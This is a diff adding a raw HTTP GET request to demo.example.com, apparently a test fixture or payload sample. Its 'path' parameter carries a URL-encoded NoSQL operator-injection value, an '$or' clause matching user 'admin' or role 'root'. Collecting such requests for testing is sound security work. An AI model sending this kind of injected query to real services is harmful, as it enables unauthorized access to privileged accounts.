@@ -1,0 +1,4 @@
+GET /a?path=%7B%22%24or%22%3A%5B%7B%22user%22%3A%22admin%22%7D%2C%7B%22role%22%3A%22root%22%7D%5D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
